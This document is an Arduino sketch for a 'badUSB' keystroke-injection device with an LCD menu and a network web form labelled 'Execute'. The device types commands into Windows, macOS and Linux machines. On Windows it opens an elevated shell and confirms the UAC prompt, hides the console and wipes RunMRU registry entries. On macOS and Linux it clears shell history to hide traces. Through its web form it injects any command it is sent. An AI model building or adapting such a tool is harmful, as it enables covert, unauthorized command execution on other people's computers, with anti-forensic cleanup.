#include "Keyboard.h"
#include <LiquidCrystal.h>
#include <SPI.h>
#include <Ethernet.h>
/*
Arduino badUSB
Author: @037
github.com/649
qmosi.com/akm

More information: https://qumosi.com/projects.php?id=5946780
Latest version: https://github.com/649/Arduino-badUSB/tree/main 

Use responsibly.

*/
byte mac[] = { 0xDE, 0xAD, 0xBE, 0xEF, 0xFE, 0xED };
IPAddress ip(192, 168, 2, 101);

EthernetServer server(80);

String readString;

// IMPORTANT: You must solder a wire from A2 to the 4th pin ontop of the LCD keypad
// This is to prevent a conflict between the ethernet shield and LCD keypad shield
// See images attached to the project at https://qumosi.com/projects.php?id=5946780 for more information
LiquidCrystal lcd(8, 9, A2, 5, 6, 7);

// define some values used by the panel and buttons
int lcd_key     = 0;
int adc_key_in  = 0;
#define btnRIGHT  0
#define btnUP     1
#define btnDOWN   2
#define btnLEFT   3
#define btnSELECT 4
#define btnNONE   5

// read the buttons
int read_LCD_buttons(){
 adc_key_in = analogRead(0);      // read the value from the sensor 
 // my buttons when read are centered at these valies: 0, 144, 329, 504, 741
 // we add approx 50 to those values and check to see if we are close
 if (adc_key_in > 1000) return btnNONE; // We make this the 1st option for speed reasons since it will be the most likely result
 // For V1.1 us this threshold
 /*
 if (adc_key_in < 50)   return btnRIGHT;

 
 if (adc_key_in < 250)  return btnUP; 
 if (adc_key_in < 450)  return btnDOWN; 
 if (adc_key_in < 650)  return btnLEFT; 
 if (adc_key_in < 850)  return btnSELECT;  
*/
 // For V1.0 comment the other threshold and use the one below:

 if (adc_key_in < 50)   return btnRIGHT;  
 if (adc_key_in < 195)  return btnUP; 
 if (adc_key_in < 380)  return btnDOWN; 
 if (adc_key_in < 555)  return btnLEFT; 
 if (adc_key_in < 790)  return btnSELECT;   

 return btnNONE;  // when all others fail, return this...
}

void main_page(EthernetClient &client){
  // send a standard http response header
  client.println("HTTP/1.1 200 OK");
  client.println("Content-Type: text/html");
  client.println("Connection: close");  // the connection will be closed after completion of the response
  client.println();
  client.println("<!DOCTYPE HTML>");
  client.println("<html>");
  client.println("<body style=\"font-weight:bold;color:red;background-color:black;\">\n<img src=\"https://raw.githubusercontent.com/649/Arduino-badUSB/main/badusb.png\" width=\"10%\" height=\"10%\">\n<form action=\"/\" method=\"post\"><label for=\"#c\">Command:</label><br><textarea style=\"font-weight:bold;color:white;background-color:#424242;\" id=\"#c\" name=\"#c\" rows=\"4\" cols=\"50\" placeholder=\"root:~#\"></textarea>");
  client.println("<br><label for=\"#o\">OS:</label>\n<select style=\"font-weight:bold;color:white;background-color:#424242;\" name=\"#o\" id=\"#o\">");
  client.println("<option value=\"1\">Windows</option><option value=\"2\">macOS</option><option value=\"3\">Ubuntu Linux</option><option value=\"4\">Other</option>");
  client.println("</select>");
  client.println("<br><br>\n<input style=\"font-weight:bold;color:white;background-color:#8b0000;\" type=\"submit\" value=\"Execute\"></form>\n</body></html>");
}

void parser(char* data){
  // Create two pointers that point to the start of the data
  char *leader = data;
  char *follower = leader;
  
  // While we're not at the end of the string (current character not NULL)
  while (*leader) {
      // Check to see if the current character is a %
      if (*leader == '%') {
  
          // Grab the next two characters and move leader forwards
          leader++;
          char high = *leader;
          leader++;
          char low = *leader;
  
          // Convert ASCII 0-9A-F to a value 0-15
          if (high > 0x39) high -= 7;
          high &= 0x0f;
  
          // Same again for the low byte:
          if (low > 0x39) low -= 7;
          low &= 0x0f;
  
          // Combine the two into a single byte and store in follower:
          *follower = (high << 4) | low;
      } else if (*leader == '+') {
        *follower = ' ';
      }else {
          // All other characters copy verbatim
          *follower = *leader;
      }
  
      // Move both pointers to the next character:
      leader++;
      follower++;
  }
  // Terminate the new string with a NULL character to trim it off
  *follower = 0;
  return data;
}

void reset_webserver_screen(){
  lcd.setCursor(0,0);
  lcd.print("SELECT: WEBHOOK "); // first line
  lcd.setCursor(0,1);
  lcd.print(Ethernet.localIP());
}

void web_server(){
  Serial.println(F("[*] Web server started"));
  Serial.print(F("[*] http://"));
  Serial.println(Ethernet.localIP());
  while(true){
    boolean bPendingHttpResponse = false;
    EthernetClient client = server.available();
    if (client) {
      // Connection exists
      Serial.println(F("---START---"));
      while (client.connected()) {
        // Pending request?
        if (client.available()) {
          bPendingHttpResponse = true;
          parse_http(client);
          reset_webserver_screen();
        }else{
          if(bPendingHttpResponse){
            bPendingHttpResponse = false;
            main_page(client);
            // give the web browser time to receive the data
            delay(1);
            // close the connection:
            client.stop();
          }
        }
      }
      Serial.println(F("---END---"));
    }
  }
}

void startup(String head){
  lcd.setCursor(0,0);
  lcd.print("SELECT: "+head);
  
  lcd.setCursor(0,1);
  lcd.print(F("    EXEC: 03    "));
  delay(1000);
  lcd.setCursor(0,1);
  lcd.print(F("    EXEC: 02    "));
  delay(1000);
  lcd.setCursor(0,1);
  lcd.print(F("    EXEC: 01    "));
  delay(1000);
  lcd.setCursor(0,1);
  lcd.print(F("   INJECTING!   "));
  delay(1000);
}

void winload(){
  winload("start \"link\" \"https://qmosi.com/akm\"");
}
void winload(String command){
  //LAUNCHES ELEVATED TERMINAL SESSION
  //===================================//
   Keyboard.press(0x83);
   delay(100);
   Keyboard.press('r');
   delay(100);
   Keyboard.releaseAll();
   delay(1000);
  lcd.setCursor(0,1);
  lcd.print("   EXECUTING.   ");
  //BYPASS UAC PROMPT
   Keyboard.print("powershell Start-Process cmd -Verb runAs");
   delay(100);
   Keyboard.press(0xB0);
   delay(100);
   Keyboard.releaseAll();
   delay(4000);
  lcd.setCursor(0,1);
  lcd.print("   EXECUTING..  ");
   Keyboard.press(0x82);
   delay(100);
   Keyboard.press('y');
   delay(100);
   Keyboard.releaseAll();
   delay(1000);
  lcd.setCursor(0,1);
  lcd.print("   EXECUTING... ");
  //OBFUSCATES CMD
   Keyboard.print("mode con:cols=18 lines=1");
   delay(100);
   Keyboard.write(0xB0);
   delay(100);
   Keyboard.print("color F7");
   delay(100);
   Keyboard.write(0xB0);
   delay(200);
   Keyboard.press(0x82);
   delay(100);
   Keyboard.press(' ');
   delay(100);
   Keyboard.press('m');
   delay(100);
   Keyboard.releaseAll();
   delay(500);
  lcd.setCursor(0,1);
  lcd.print("   EXECUTING..  ");
   for (int i = 0; i < 100; i++){
     Keyboard.press(0xD9);
     delay(10);
     Keyboard.releaseAll();
     delay(20);
     Keyboard.press(0xD8);
     delay(10);
     Keyboard.releaseAll();
     delay(20);
   }
  Keyboard.write(0xB0);
  delay(500);
  lcd.setCursor(0,1);
  lcd.print("   EXECUTING.   ");
  //EXEC PAYLOAD
   Keyboard.print("powershell ");
   Keyboard.print("\"");
   Keyboard.print("Remove-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU' -Name ");
   Keyboard.print("'*' -ErrorAction SilentlyContinue");
   Keyboard.print("\"");
   delay(100);
   Keyboard.write(0xB0);
   delay(200);
   Keyboard.print(command);
   delay(200);
   Keyboard.write(0xB0);
   delay(100);
   Keyboard.print("exit");
   delay(100);
   Keyboard.write(0xB0);
   delay(4000);
   Keyboard.press(0x83);
   delay(20);
   Keyboard.press(0xD9);
   delay(10);
   Keyboard.releaseAll();
}

void macload(){
  macload("open https://qmosi.com/akm");
}
void macload(String command){
  //LAUNCHES ELEVATED TERMINAL SESSION
  //===================================//
  Keyboard.press(0x83);
  delay(100);
  Keyboard.press(' ');
  delay(100);
  Keyboard.releaseAll();
   lcd.setCursor(0,1);
   lcd.print("   EXECUTING.   ");
  Keyboard.print("terminal");
  delay(5000);
  Keyboard.write(0xB0);
  delay(1000);
   lcd.setCursor(0,1);
   lcd.print("   EXECUTING..  ");
  // EXECUTE PAYLOAD
  Keyboard.print(command);
  Keyboard.print(" & osascript -e 'tell application \"Terminal\" to close first window' & exit");
  delay(100);
  Keyboard.write(0xB0);
  delay(1000);
   lcd.setCursor(0,1);
   lcd.print("   EXECUTING... ");
  Keyboard.press(0x83);
  delay(100);
  Keyboard.press('h');
  delay(100);
  Keyboard.releaseAll();
  delay(100);
  // GOES BACK TO HIDE TRACES
  Keyboard.press(0x83);
  delay(100);
  Keyboard.press(' ');
  delay(100);
  Keyboard.releaseAll();
  delay(1000);
   lcd.setCursor(0,1);
   lcd.print("   EXECUTING..  ");
  Keyboard.write(0xB0);
  delay(1000);
   lcd.setCursor(0,1);
   lcd.print("   EXECUTING.   ");
  Keyboard.print("history -c");
  delay(100);
  Keyboard.write(0xB0);
  delay(100);
  Keyboard.press(0x83);
  delay(100);
  Keyboard.press('q');
  delay(100);
  Keyboard.releaseAll();
  delay(200);
  Keyboard.press(0x83);
  delay(100);
   lcd.setCursor(0,1);
   lcd.print("   EXECUTING..  ");
  Keyboard.press(' ');
  delay(100);
  Keyboard.releaseAll();
  delay(200);
  Keyboard.write(0xB2);
  delay(100);
  Keyboard.press(0x83);
  delay(100);
  Keyboard.press(' ');
  delay(100);
  Keyboard.releaseAll();
   lcd.setCursor(0,1);
   lcd.print("   EXECUTING... ");
}

void tuxload(){
  tuxload("xdg-open 'https://qmosi.com/akm'");
}
void tuxload(String command){
  //LAUNCHES ELEVATED TERMINAL SESSION
  //===================================//
  Keyboard.press(0x82);
  delay(200);
  Keyboard.press(0xC3);
  delay(200);
  Keyboard.releaseAll();
   lcd.setCursor(0,1);
   lcd.print("   EXECUTING.   ");
  delay(1000);
  Keyboard.print("xterm");
  delay(300);
  Keyboard.write(0xB0);
  delay(3000);
   lcd.setCursor(0,1);
   lcd.print("   EXECUTING..  ");
  //EXEC PAYLOAD
  Keyboard.print(command);
  Keyboard.print(" && cat /dev/null > ~/.bash_history && history -c && exit");
  delay(300); 
   lcd.setCursor(0,1);
   lcd.print("   EXECUTING... ");
  Keyboard.write(0xB0);
  delay(100);
}
// Allows for arbitrary HID keys without OS specific wrappers
void rawload(String command){
  Keyboard.releaseAll();
  lcd.setCursor(0,1);
  lcd.print("   EXECUTING.   ");
  delay(1000);
  Keyboard.print(command);
  delay(300);
  Keyboard.write(0xB0);
}

void sysidler(){
  lcd.setCursor(0,0);
  lcd.print("  SYSTEM IDLE!   ");
  int i = 0;
  while(true){
    lcd.setCursor(0,1);
    lcd.print("      ");
    lcd.print(i);
    lcd.print("      ");
    Keyboard.press(0x80);
    Keyboard.releaseAll();
    delay(10000);
    i++;
  }
}


void parse_http(EthernetClient &client){
  char c;
  // http headers
  while((c = client.read()) != '%' && client.available()){
    Serial.print(c);
  }
  if(client.available() > 0){
    Serial.print(F("[*] Payload-Length: "));
    int buff = client.available()-11;
    Serial.println(buff);
    Serial.println(F("---COMMAND---"));
    for(int i = 0; i < 4 && client.available(); i++){
      client.read();// burn em!
    }

    String command;
    while((c = client.read()) != '&' && client.available()){
      command += c;
    }
    command += '\0';
    int str_len = command.length() + 1;
    char com[str_len]; 
    command.toCharArray(com, str_len);
    parser(com);
    Serial.println(com);
    
    Serial.println(F("---OS---"));
    for(int i = 0; i < 5 && client.available(); i++){
      client.read();// burn em!
    }
    if(client.available() > 0){
      c = client.read();
      int ch = int(c);
      if(ch == 49){
        Serial.println(F("Windows"));
        winload(com);
      }else if(ch == 50){
        Serial.println(F("macOS"));
        macload(com);
      }else if(ch == 51){
        Serial.println(F("Ubuntu Linux"));
        tuxload(com);
      }else if(ch == 51){
        Serial.println(F("Raw payload"));
        rawload(com);
      }
    }else{
      Serial.println(c);
    }
  }
  while(client.available()){ // exaust w/e is left
    Serial.print(client.read());
    Serial.println(F("meatballs"));
  }
}


void verend(){
  verend(false);
}
void verend(bool x){
  lcd.setCursor(0,0);
  lcd.print("  badUSB v3.72  ");
  lcd.setCursor(0,1);
  if(x == true){
    lcd.print("<SELECT PAYLOAD>");
  }else{
    lcd.print("PROCESS COMPLETE"); 
  }
  delay(1000);
}

void setup(){ 
  Serial.begin(9600);
  
  Ethernet.init(10);
  Ethernet.begin(mac, ip);

  // Check for Ethernet hardware present
  if (Ethernet.hardwareStatus() == EthernetNoHardware) {
    while (true) {
      Serial.println("Shield down");
      delay(1000); // do nothing, no point running without Ethernet hardware
    }
  }
  if (Ethernet.linkStatus() == LinkOFF) {
    Serial.println("Ethernet cable is not connected.");
  }

  server.begin();
  Keyboard.begin();
  lcd.begin(16, 2);              // start the library
  verend(true);
}
 
void loop(){
 lcd.setCursor(0,1);            // move to the begining of the second line
 lcd_key = read_LCD_buttons();  // read the buttons

 // depending on which button was pushed, we perform an action
 switch (lcd_key){
   case btnRIGHT:
     {
      startup("WINLOAD"); // starts pre-configured windows payload
      winload();
      verend();
      break;
     }
   case btnLEFT:
     {
      startup("MACLOAD"); // starts pre-configured mac payload
      macload();
      verend();
      break;
     }
   case btnUP:
     {
      startup("TUXLOAD"); // starts pre-configured linux payload
      tuxload();
      verend();
      break;
     }
   case btnDOWN:
     {
     lcd.setCursor(0,0);
     lcd.print("SELECT: WEBHOOK "); // starts web service
     
      lcd.setCursor(0,1);
      lcd.print(F("    EXEC: 03    "));
      delay(1000);
      lcd.setCursor(0,1);
      lcd.print(F("    EXEC: 02    "));
      delay(1000);
      lcd.setCursor(0,1);
      lcd.print(F("    EXEC: 01    "));
      delay(1000);
      if (Ethernet.linkStatus() == LinkOFF) {
        lcd.setCursor(0,1);
        lcd.print(F("LAN UNPLUGGED"));
        break;
      }else{
        lcd.setCursor(0,1);
        lcd.print(Ethernet.localIP());
        delay(1000);
        web_server();
      }

     }
   case btnSELECT:
     {

     lcd.setCursor(0,0);
     lcd.print(F("SELECT: IDLER ")); // mouse jiggler
     
      lcd.setCursor(0,1);
      lcd.print(F("    EXEC: 03    "));
      delay(1000);
      lcd.setCursor(0,1);
      lcd.print(F("    EXEC: 02    "));
      delay(1000);
      lcd.setCursor(0,1);
      lcd.print(F("    EXEC: 01    "));
      delay(1000);
      lcd.setCursor(0,1);
      lcd.print(F("     IDLING!    "));
      delay(1000);
      sysidler();
     }
   case btnNONE:
     {
     }
 }

}
